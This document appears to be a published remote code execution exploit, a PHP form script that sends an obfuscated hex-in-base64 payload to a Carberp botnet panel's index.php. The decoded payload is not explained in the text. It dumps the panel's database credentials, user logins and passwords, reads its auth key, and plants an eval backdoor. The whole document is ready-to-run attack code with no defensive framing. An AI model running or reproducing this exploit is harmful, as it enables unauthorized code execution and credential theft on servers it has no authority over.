

Type: Remote Code Execution

Author: [Xylitol](https://twitter.com/Xylit0l)

```

<table width="607" border="0">
<tr>
<td><form method="POST" action="<?php basename($_SERVER['PHP_SELF']) ?>">
<label for="carberp">Domain: </label>
<input name="urlz" type="text" id="urlz" value="http://carberpPanel.com" size="50" />
<input type="submit" name="button" id="button" value="Ownz !" />
</form></td>
</tr>
<tr>
<td><?php
/*
Xyl2k!
Greeting to Xartrick for fixing the payload (:
*/
if(!isset($_POST['urlz'])) ;
else
if(!filter_var($_POST['urlz'], FILTER_VALIDATE_URL))
{
echo "<font color='red'>URL is not valid</font>";
}
else
{
{
$data = array(
'id' => 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV',
'data' => 'Njk2ZTYzNmM3NTY0NjU1ZjZmNmU2MzY1MjgyNzY5NmU2MzZjNzU2NDY1NzMyZjYzNmY2ZTY2Njk2NzJlNzA2ODcwMjcyOTNiMjQ0MTNkMjIwZDBhMjIzYjY1NjM2ODZmMjgyNzQ0NjE3NDYxNjI2MTczNjUyNzJlMjQ0MTI5M2I2NTYzNjg2ZjI4MjcyZDJkMmQyZDJkMmQyZDJkMjcyZTI0NDEyOTNiNjU2MzY4NmYyODI3NDg2ZjczNzQzYTIwMjcyZTI0NjM2NjY3NWY2NDYyNWIyNzY4NmY3Mzc0Mjc1ZDJlMjQ0MTI5M2I2NTYzNjg2ZjI4Mjc1NTczNjU3MjNhMjAyNzJlMjQ2MzY2Njc1ZjY0NjI1YjI3NzU3MzY1NzIyNzVkMmUyNDQxMjkzYjY1NjM2ODZmMjgyNzUwNjE3MzczM2EyMDI3MmUyNDYzNjY2NzVmNjQ2MjViMjc3MDYxNzM3MzI3NWQyZTI0NDEyOTNiNjU2MzY4NmYyODI3NDQ0MjNhMjAyMDIwMjcyZTI0NjM2NjY3NWY2NDYyNWIyNzY0NjIyNzVkMmUyNDQxMmUyNDQxMjkzYjZkNzk3MzcxNmM1ZjYzNmY2ZTZlNjU2Mzc0MjgyNDYzNjY2NzVmNjQ2MjViMjc2ODZmNzM3NDI3NWQyYzI0NjM2NjY3NWY2NDYyNWIyNzc1NzM2NTcyMjc1ZDJjMjQ2MzY2Njc1ZjY0NjI1YjI3NzA2MTczNzMyNzVkMjkzYjZkNzk3MzcxNmM1ZjczNjU2YzY1NjM3NDVmNjQ2MjI4MjQ2MzY2Njc1ZjY0NjI1YjI3NjQ2MjI3NWQyOTNiMjQ0MjNkNmQ3OTczNzE2YzVmNzE3NTY1NzI3OTI4Mjc1MzQ1NGM0NTQzNTQyMDJhMjA0NjUyNGY0ZDIwNjI2NjVmNzU3MzY1NzI3MzI3MjkzYjY1NjM2ODZmMjgyNzU1NzM2NTcyNzMyNzJlMjQ0MTI5M2I2NTYzNjg2ZjI4MjcyZDJkMmQyZDJkMjcyZTI0NDEyOTNiNzc2ODY5NmM2NTI4MjQ0MzNkNmQ3OTczNzE2YzVmNjY2NTc0NjM2ODVmNjE3MzczNmY2MzI4MjQ0MjI5Mjk2NTYzNjg2ZjI4MjQ0MzViMjc2YzZmNjc2OTZlMjc1ZDJlMjczYTI3MmUyNDQzNWIyNzcwNjE3MzczNzc2ZjcyNjQyNzVkMmUyNDQxMjkzYjZkNzk3MzcxNmM1ZjY2NzI2NTY1NWY3MjY1NzM3NTZjNzQyODI0NDIyOTNiNmQ3OTczNzE2YzVmNjM2YzZmNzM2NTI4MjkzYjI0NDQzZDQ5Mjg2NjY5NmM2NTVmNjc2NTc0NWY2MzZmNmU3NDY1NmU3NDczMjgyNzY5NmU2NDY1NzgyZTcwNjg3MDI3MjkyOTNiNjU2MzY4NmYyODI0NDEyZTI3NDE3NTc0NjgyMDRiNjU3OTI3MmUyNDQxMjkzYjY1NjM2ODZmMjgyNzJkMmQyZDJkMmQyZDJkMmQyNzJlMjQ0MTI5M2I2NTYzNjg2ZjI4Mjc2ODc0NzQ3MDNhMmYyZjI3MmUyNDVmNTM0NTUyNTY0NTUyNWIyNzQ4NTQ1NDUwNWY0ODRmNTM1NDI3NWQyZTI3MmY2YzZmNjc2OTZlMmYzZjc4M2QyNzJlMjQ0NDI5M2I2Njc1NmU2Mzc0Njk2ZjZlMjA0OTI4MjQ0ODI5N2IyNDQ2M2Q2NTc4NzA2YzZmNjQ2NTI4MjcyNDYxNzU3NDZmNzI2OTdhNjU2YjY1NzkyNzJjMjQ0ODI5M2IyNDQ3M2Q2NTc4NzA2YzZmNjQ2NTI4MjczYjI3MmMyNDQ2NWIzMTVkMjkzYjY1NzY2MTZjMjgyNzI0NDUyNzJlMjQ0NzViMzA1ZDJlMjczYjI3MjkzYjcyNjU3NDc1NzI2ZTIwMjQ0NTNiN2Q=');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_POST['urlz'] . "/index.php");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch,CURLOPT_TIMEOUT,30);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$contents = curl_exec($ch);
curl_close($ch);
if (preg_match("#-#", $contents))
{ echo "<pre>" . $contents . "</pre>"; }
else
{ echo "<font color='red'>Not vulnerable :(</font>"; }
}
}
?></td>
</tr>
</table>
```
